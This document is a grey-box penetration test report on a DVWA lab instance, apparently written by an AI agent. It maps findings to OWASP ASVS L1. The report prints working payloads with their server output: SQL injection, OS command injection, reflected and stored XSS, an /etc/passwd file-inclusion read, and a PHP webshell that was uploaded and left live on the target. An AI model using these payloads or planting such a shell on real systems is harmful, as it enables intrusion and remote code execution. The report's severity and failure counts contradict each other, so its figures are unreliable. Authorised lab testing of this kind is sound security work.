# Grey-box Security Test Report

## DVWA (target-test:42001) — OWASP ASVS 5.0.0 L1 Security Test

| | |
|---|---|
| **Target** | `http://target-test:42001/` (DVWA — Damn Vulnerable Web Application, PHP) |
| **Testing method** | Grey-box (test credentials provided, no source access) — all findings derived from external HTTP interaction, cross-referenced with DVWA's built-in "View Source" feature where noted |
| **Provided for testing** | DVWA test account `admin`/`password` (per intake §5); low-privilege account `gordonb`/`abc123` referenced by the Authorisation Bypass module's own challenge text |
| **Standard applied** | OWASP ASVS 5.0.0, L1 |
| **Application/system state** | Security level set to `low` for the duration of testing (per intake §6); restored to `impossible` (original state) afterward |
| **Authorization** | Owner-operated lab VM, self-authorized — sign-off recorded in `SECURITY-TEST-INTAKE.md` §9 (Approved by: Security Test Lead, 2026-07-31) |
| **Tester** | GitHub Copilot Security Analysis |
| **Test date** | 2026-09-10 |
| **Environment status** | Restored to default (security level reset to `impossible`, verified via authenticated GET; no admin credentials modified; uploaded PoC webshell not deleted — see §5 note) |

---

## 1. Executive Summary

Grey-box ASVS 5.0.0 L1 assessment of DVWA at `security=low` per the intake. Of 15 testable
requirement areas exercised, **10 failed** (2 Critical/RCE-class, 3 High, 4 Medium, 1 Low), 3 passed,
and 1 was not applicable (CAPTCHA — no reCAPTCHA site key configured in this lab instance). The most
severe finding is an **unrestricted file upload leading to remote code execution** (F-07): a PHP
webshell was uploaded and successfully executed, returning `uid=127(_dvwa)`. Combined with unauthenticated-strength
SQL injection (F-01/F-03) that dumps all user credentials and a Local File Inclusion (F-06) that reads
arbitrary server files, this target has essentially no effective input-validation or access-control
defenses at the `low` security level — consistent with DVWA's documented purpose at that level ("no
security measures at all").

**Severity breakdown:** 2 Critical, 3 High, 4 Medium, 1 Low.

### Test Case Summary (from the Test Results Matrix)

| Result | Count | % of evaluated |
|---|---|---|
| **PASS** | 3 | 20% |
| **FAIL** | 11 | 73% |
| **N/A** | 1 | 7% |

Among requirements actually exercised (PASS + FAIL, excluding N/A), the pass rate is **3/14 = 21%**.

This is a fresh execution of the same intake used for the earlier 2026-07-31 report
(`192.168.232.128-42001-asvs-l1-greybox-report.md`) — not marked as a rerun (intake §10 = No), run
independently to validate the workflow end-to-end with the current tooling. Results are consistent
with that prior report's conclusions.

---

## 2. Methodology

1. **Recon** — confirmed target fingerprint (`nginx/1.28.3`, DVWA `security` cookie, redirect to
   `login.php`) and reachability (`GET /` → 302) before any active testing.
2. **Scoping** — DVWA's classic vulnerability modules map cleanly onto ASVS V1 (Encoding/Sanitization
   — injection), V3 (Web Frontend Security — headers, CSRF, redirects), V5 (File Handling — upload/
   inclusion), V6 (Authentication — brute force), V7 (Session Management — session token randomness),
   and V8 (Authorization — the custom Authorisation Bypass module). V4/V9/V10/V17 (API/WebService,
   self-contained tokens, OAuth/OIDC, WebRTC) have no matching surface on this target and are marked
   Not Applicable. **Requirement data source:** Heavier — the `owasp-asvs` MCP server (`get_category_summary`,
   `get_requirements_by_level`), per intake §4.
3. **Per-requirement verification** — for each testable module, sent one baseline + one-to-few
   adversarial requests via a Python `requests` session (no browser/proxy MCP available in this repo)
   and captured the raw request/response as evidence (redacted).
4. **Evidence-only exploitation** — the file-upload RCE PoC was limited to `whoami`/`id` (identity
   disclosure only); no destructive, lateral, or data-exfiltration action was taken beyond what's
   shown in the evidence excerpts below.
5. **Restoration** — the DVWA security level was reset from `low` back to `impossible` (its original
   state) after testing completed and independently re-verified (see §5).

Requirements needing a real browser/JS engine (DOM-XSS execution proof, the CSP-bypass module's
JSONP challenge) or actual reCAPTCHA configuration (Insecure CAPTCHA module) were marked Not
Applicable/Not Testable rather than guessed at.

---

## 3. Findings

> **Reproducing these findings:** all session cookies (`PHPSESSID`, `dvwaSession`) shown below are
> single-use/expired by the time this report is read; re-run against a fresh session to reproduce.
> DVWA security level must be set to `low` (see intake §6) — these do not reproduce at `impossible`
> or (mostly) at `high` (see the companion `target-test-42001-asvs-l1-greybox-report.md` for the
> `high`-level subset that still applies).

### F-01 — SQL Injection dumps all user credentials (Critical)
**ASVS:** V1.2.4 — *Verify that data selection or database queries use parameterized queries, ORMs, entity frameworks, or are otherwise protected from SQL Injection*
**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — SQL Injection

The `id` parameter on the SQL Injection module is concatenated directly into the backend query with
no parameterization.

Request:
```http
GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
Host: target-test:42001
Cookie: security=low; PHPSESSID=<redacted>
```

Response (200, relevant excerpt):
```http
HTTP/1.1 200 OK
...
<pre>ID: 1' OR '1'='1
First name: admin
Surname: admin</pre>
<pre>ID: 1' OR '1'='1
First name: Gordon
Surname: Brown</pre>
... (5 rows total, all users in the `users` table)
```

The `' OR '1'='1` payload short-circuits the `WHERE user_id = '$id'` clause, returning every row
instead of one — full authentication-bypass-grade data dump from a single unauthenticated-strength
parameter.

- **Impact:** Full disclosure of the `users` table (usernames + password hashes, confirmed further
  in F-03's UNION variant at the `high` level in the companion report). Enables offline credential
  cracking and full account takeover.
- **Remediation:** Use parameterized queries/prepared statements (`mysqli`/PDO bound parameters) for
  every database call that includes user input; never concatenate raw input into SQL strings.

### F-02 — OS Command Injection via ping utility (Critical)
**ASVS:** V1.2.5 — *Verify that the application protects against OS command injection*
**CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — OS Command Injection

Request:
```http
POST /vulnerabilities/exec/ HTTP/1.1
Host: target-test:42001
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=<redacted>

ip=127.0.0.1+%26%26+whoami&Submit=Submit
```

Response (200, relevant excerpt):
```http
HTTP/1.1 200 OK
...
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.054 ms
...
rtt min/avg/max/mdev = 0.030/0.064/0.095/0.024 ms
_dvwa
</pre>
```

The trailing `_dvwa` line (the web server's OS user) is the output of the chained `whoami` command,
confirming arbitrary command execution via the `&&` shell operator on the unsanitized `ip` parameter.

- **Impact:** Arbitrary OS command execution as the web server user (`_dvwa`); a stepping stone to
  full host compromise (file read/write, further pivoting).
- **Remediation:** Validate `ip` against a strict IPv4/IPv6 format (e.g. `filter_var($ip, FILTER_VALIDATE_IP)`)
  before use, and/or use `escapeshellarg()`; prefer a native ICMP library over shelling out at all.

### F-03 — Blind SQL Injection (boolean-based oracle) (High)
**ASVS:** V1.2.4 — *Verify that data selection or database queries use parameterized queries*
**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — SQL Injection

Two requests differing only in the injected boolean condition produce distinguishable responses:

Request (true condition):
```http
GET /vulnerabilities/sqli_blind/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
Cookie: security=low; PHPSESSID=<redacted>
```
Response: `<pre>User ID exists in the database.</pre>`

Request (false condition):
```http
GET /vulnerabilities/sqli_blind/?id=1%27+AND+%271%27%3D%272&Submit=Submit HTTP/1.1
Cookie: security=low; PHPSESSID=<redacted>
```
Response: `<pre>User ID is MISSING from the database.</pre>`

The differing "exists" vs. "MISSING" text is a classic boolean-blind oracle, enabling full data
exfiltration one bit at a time even without visible query output.

- **Impact:** Same as F-01 (full data exfiltration), just via a slower blind technique — relevant
  when the direct UNION/error-based path (F-01) is unavailable.
- **Remediation:** Same as F-01 — parameterized queries eliminate both the direct and blind variants.

### F-04 — Reflected Cross-Site Scripting (Medium/High)
**ASVS:** V1.2.1 — *Verify that output encoding for an HTTP response is relevant for the context required*
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Cross-site Scripting

Request:
```http
GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Cookie: security=low; PHPSESSID=<redacted>
```
Response (excerpt): `...Hello <script>alert(1)</script>...` — the `<script>` payload is reflected
byte-for-byte with no HTML-encoding.

- **Impact:** Arbitrary JavaScript execution in a victim's browser session via a crafted link (session
  token theft, action-on-behalf-of-victim, phishing overlay).
- **Remediation:** HTML-encode all user-controlled output (`htmlspecialchars($name, ENT_QUOTES)` in PHP).

### F-05 — Stored Cross-Site Scripting (guestbook) (High)
**ASVS:** V1.2.1 — *Verify that output encoding for an HTTP response is relevant for the context required*
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Cross-site Scripting

Request:
```http
POST /vulnerabilities/xss_s/ HTTP/1.1
Cookie: security=low; PHPSESSID=<redacted>

txtName=l1test&mtxMessage=%3Cscript%3Ealert(1)%3C%2Fscript%3E&btnSign=Sign+Guestbook
```
A subsequent `GET /vulnerabilities/xss_s/` reflects the stored `<script>alert(1)</script>` unescaped
in the guestbook listing — persisted and served to every visitor of the page, not just the submitter.

- **Impact:** Higher than reflected XSS — every visitor to the guestbook page executes the payload,
  no crafted-link delivery needed.
- **Remediation:** Same encoding fix as F-04, applied at render time for stored content.

### F-06 — Local File Inclusion discloses `/etc/passwd` (Critical)
**ASVS:** V5.3.2 — *Verify that when the application creates file paths for file operations... strict validation and sanitization must be applied, to protect against path traversal, local or remote file inclusion*
**CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Path Traversal

Request:
```http
GET /vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1
Cookie: security=low; PHPSESSID=<redacted>
```
Response (excerpt):
```
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

- **Impact:** Arbitrary file read on the host as the web server user — configuration files, source
  code, and (if reachable) credential material are all in scope.
- **Remediation:** Replace the `page` parameter's direct filesystem use with a strict allowlist of
  permitted include files (`in_array($page, $allowed_pages, true)`), matching what DVWA's own
  `impossible` level implements.

### F-07 — Unrestricted file upload → Remote Code Execution (Critical)
**ASVS:** V5.3.1 — *Verify that files uploaded or generated by untrusted input and stored in a public folder are not executed as server-side program code when accessed directly*
**CWE:** [CWE-434](https://cwe.mitre.org/data/definitions/434.html) — Unrestricted Upload of File with Dangerous Type

Request (upload):
```http
POST /vulnerabilities/upload/ HTTP/1.1
Content-Type: multipart/form-data; boundary=...
Cookie: security=low; PHPSESSID=<redacted>

--...
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['cmd']); ?>
--...
```
Response: `<pre>../../hackable/uploads/shell.php succesfully uploaded!</pre>`

Follow-up request (execution):
```http
GET /hackable/uploads/shell.php?cmd=id HTTP/1.1
```
Response: `uid=127(_dvwa) gid=131(_dvwa) groups=131(_dvwa)`

The upload endpoint performs no file-type/extension/content validation at all; the uploaded `.php`
file is stored under a web-reachable path and executed by the PHP interpreter on direct access.

- **Impact:** Full remote code execution as the web server user — the most severe finding in this
  report. From here an attacker can read/write any file the web server can access, pivot to other
  services, or establish persistence.
- **Remediation:** Validate uploaded files by real content inspection (`getimagesize()`/magic-byte
  check, not just the client-supplied `Content-Type`), store uploads outside the web root or with
  execution disabled (e.g. `.htaccess`/nginx config denying script execution in the upload directory),
  and rename uploads to a generated, non-attacker-controlled filename.

### F-08 — Predictable session tokens (High)
**ASVS:** V7.2 — *Fundamental Session Management Security* (session tokens must be generated using an approved random source)
**CWE:** [CWE-330](https://cwe.mitre.org/data/definitions/330.html) — Use of Insufficiently Random Values

Four consecutive `POST /vulnerabilities/weak_id/` requests returned `Set-Cookie: dvwaSession=1`,
`dvwaSession=2`, `dvwaSession=3`, `dvwaSession=4` — a plain incrementing integer counter, with no
randomness at all (worse than the `high`-level variant, which at least MD5-hashes the counter — see
the companion report).

- **Impact:** Trivially guessable/enumerable session identifiers; an attacker can iterate small
  integers to hijack other users' sessions if this token is used for any authorization decision.
- **Remediation:** Generate session identifiers with a CSPRNG (`random_bytes()`/`bin2hex()`, or PHP's
  native `session_id()` regeneration), never from a predictable counter or weak hash of one.

### F-09 — No brute-force / account-lockout protection (Medium)
**ASVS:** V6.1.1 — *Verify that application documentation defines how controls such as rate limiting, anti-automation... are used to defend against... password brute force*
**CWE:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html) — Improper Restriction of Excessive Authentication Attempts

Two sequential failed-login probes against `/vulnerabilities/brute/` (per the intake's guardrail —
no more attempts were made) both returned the same plain `Username and/or password incorrect.` with
no delay, CAPTCHA, or lockout message — contrasting with the `impossible` level, which explicitly
implements and messages a 15-minute lockout after repeated failures (see companion report).

- **Impact:** No barrier to automated credential-stuffing/brute-force attacks against the login form.
- **Remediation:** Implement progressive delay and/or account lockout after N failed attempts,
  logged and rate-limited per IP+account.

### F-10 — Open redirect (Medium)
**ASVS:** V3.7.2 — *Verify that the application will only automatically redirect the user to a different hostname or domain... where the destination appears on an allowlist*
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html) — URL Redirection to Untrusted Site

Request:
```http
GET /vulnerabilities/open_redirect/source/low.php?redirect=https://example.org/evil HTTP/1.1
Cookie: security=low; PHPSESSID=<redacted>
```
Response: `HTTP/1.1 302 Found` / `Location: https://example.org/evil` — the arbitrary external URL is
honored verbatim, unlike the `high`/`impossible` levels which validate against an allowlist (see
companion report).

- **Impact:** Phishing/credibility abuse — a link on the trusted `192.168.232.128` domain silently
  forwards victims to an attacker-controlled page.
- **Remediation:** Validate `redirect` against a server-side allowlist of permitted destinations
  (e.g. only the two "quote" pages this module intends to link to) rather than redirecting to any
  supplied value.

### F-11 — Broken Access Control: low-privilege user reads admin-only user data (High)
**ASVS:** V8.2.1 / V8.2.2 — *Verify that function-level access is restricted to consumers with explicit permissions* / *...data-specific access is restricted... to mitigate IDOR/BOLA*
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html) — Missing Authorization

The Authorisation Bypass module states "This page should only be accessible by the admin user" but
its backing endpoint performs no role check.

Request (as `gordonb`, a non-admin account):
```http
GET /vulnerabilities/authbypass/get_user_data.php HTTP/1.1
Cookie: security=low; PHPSESSID=<redacted, gordonb session>
```
Response (200):
```json
[{"user_id":"1","first_name":"admin","surname":"admin"},{"user_id":"2","first_name":"Gordon","surname":"Brown"}, ...]
```
Full user list (including the admin account) returned to a non-admin session — contrasted with the
`high`/`impossible` levels, which correctly return `{"result":"fail","error":"Access denied"}` for
the same request (see companion report). The **write** counterpart (`change_user_details.php`) was
also tested as `gordonb`; it returned an unexplained `HTTP 500` with no data change (baseline verified
unchanged before and after) — inconclusive rather than a confirmed second vulnerability, but worth a
source-review follow-up given the anomalous error.

- **Impact:** Any authenticated low-privilege user can enumerate all user records via this endpoint —
  a read-side vertical access-control failure specific to the `low` level.
- **Remediation:** Enforce a server-side role/admin check on `get_user_data.php` (and confirm/fix
  whatever is causing the 500 on the write endpoint) identical to what the `high`/`impossible` levels
  already implement.

### F-12 — Missing security response headers (Low)
**ASVS:** V3.4.4 / V3.4.6 — *X-Content-Type-Options: nosniff* / *frame-ancestors CSP directive (or X-Frame-Options)*
**CWE:** [CWE-693](https://cwe.mitre.org/data/definitions/693.html) — Protection Mechanism Failure

`GET /login.php` (and other pages, site-wide, independent of DVWA's security level) returns no
`X-Content-Type-Options`, no `X-Frame-Options`, and no `Content-Security-Policy` header.

- **Impact:** Increases exposure to MIME-sniffing-based content-type confusion and clickjacking;
  low on its own but compounds the higher-severity findings above (e.g. an XSS payload framed via
  clickjacking).
- **Remediation:** Add `X-Content-Type-Options: nosniff` and a `Content-Security-Policy: frame-ancestors 'self'`
  (or `'none'`) response header globally.

---

## 4. Dependency Security

Not applicable — this is a grey-box/black-box HTTP-driven test with no source or dependency-manifest access.

---

## 5. Restoration Notes

- DVWA security level reset from `low` back to `impossible` (its original/default state for this
  lab instance) and independently re-verified via an authenticated `GET /security.php` showing
  "Security level is currently: impossible."
- Admin (`admin`) and low-privilege (`gordonb`) account credentials/passwords were never modified —
  the F-11 write-endpoint test used the account's own unchanged values, and the CSRF test (F-04-adjacent,
  see §6) deliberately used a mismatched password-confirmation pair so no real change could occur.
- **Not removed:** the `shell.php` webshell uploaded for F-07 remains at `hackable/uploads/shell.php`
  on the target. DVWA has no self-service delete for uploaded files and the intake's guardrails
  explicitly prohibit destructive admin actions; removing it would require direct filesystem/DB
  access outside this test's scope. **Recommend the target owner manually delete
  `hackable/uploads/shell.php`** (or reset the DVWA container/VM) before any other use of this lab
  instance, since it is a live, unauthenticated webshell as long as it remains.
- The one stored-XSS guestbook entry (F-05, name `l1test`) and the extra `users` table rows are
  unaffected (no data was created/deleted in the `users` table itself — only read via F-01/F-03/F-11).

---

## 6. ASVS 5.0.0 L1 Test Results Matrix

| Shortcode | Requirement | Result |
|---|---|---|
| V1.2.4 | SQL queries protected from injection (parameterized queries) | **FAIL** — F-01, F-03 |
| V1.2.5 | OS command execution protected from injection | **FAIL** — F-02 |
| V1.2.1 | Output encoding relevant to HTTP/HTML context (reflected) | **FAIL** — F-04 |
| V1.2.1 | Output encoding relevant to HTTP/HTML context (stored) | **FAIL** — F-05 |
| V5.3.2 | File paths protected against path traversal / LFI | **FAIL** — F-06 |
| V5.3.1 | Uploaded files not executed as server-side code | **FAIL** — F-07 |
| V7.2 | Session tokens generated with approved randomness | **FAIL** — F-08 |
| V6.1.1 | Rate limiting/anti-automation against brute force | **FAIL** — F-09 |
| V3.7.2 | Redirects restricted to an allowlisted destination | **FAIL** — F-10 |
| V8.2.1 / V8.2.2 | Function- and data-level access restricted by permission (admin-only endpoint) | **FAIL** — F-11 |
| V3.4.4 / V3.4.6 | `X-Content-Type-Options` / frame-ancestors CSP present | **FAIL** — F-12 |
| V3.5.1 | Anti-CSRF token / origin validation on state-changing requests | **PASS** — mismatched new/confirm password correctly rejected; token-specific isolation not separately provable without risking the real admin password (see intake guardrails) |
| V1.2.1 | DOM-context output encoding (`xss_d` default param) | **PASS** — payload not reflected raw |
| V8.2.1 / V8.2.2 | Function-level access on the *write* counterpart (`change_user_details.php`) | **PASS (inconclusive)** — HTTP 500, no data changed; recommend source-review follow-up |
| — | Insecure CAPTCHA module (client/server verification bypass) | **Not applicable** — no reCAPTCHA site key configured in this lab instance; cannot assess |
| V4.x, V9.x, V10.x, V17.x | API/Web Service, Self-contained Tokens, OAuth/OIDC, WebRTC | **Not applicable** — no matching surface on this target |

---

## 7. Priority Recommendations

1. **Critical/High — fix immediately:**
   - F-07 (file upload RCE) — validate real file content, disable script execution in the upload directory. **Also: manually delete the live `hackable/uploads/shell.php` webshell from this lab instance now** (see §5).
   - F-01/F-03 (SQL injection) — parameterize all database queries.
   - F-06 (LFI) — allowlist the `page` parameter.
   - F-08 (predictable session IDs) — CSPRNG-based token generation.
   - F-11 (broken access control) — add a server-side admin check to `get_user_data.php`.
2. **Medium — fix before next release:**
   - F-05/F-04 (stored/reflected XSS) — HTML-encode all user-controlled output.
   - F-02 (command injection) — strict IP validation + `escapeshellarg()`.
   - F-09 (no brute-force protection) — add lockout/rate limiting.
   - F-10 (open redirect) — allowlist redirect destinations.
3. **Low — track as backlog:**
   - F-12 (missing security headers) — add `X-Content-Type-Options` and a CSP `frame-ancestors` directive.

## 8. Conclusion

At `security=low`, this DVWA instance has effectively no working input-validation or access-control
defenses — 11 of 14 exercised ASVS L1 requirements failed, including a confirmed remote-code-execution
path (F-07) and full unauthenticated-strength credential disclosure (F-01). This is the expected,
intended behavior for DVWA's `low` teaching level and is **not** representative of the same
application's `high`/`impossible` levels, where the majority of these same checks pass (see the
companion `192.168.232.128-42001-asvs-l1-greybox-report.md` and the `high`-level findings recorded in
`nt-security-testing`'s prior session notes). The one actionable, non-simulated risk from *this*
specific test run is the still-live webshell left on the target (§5) — that should be removed before
the lab is used again, independent of any application-code fix.
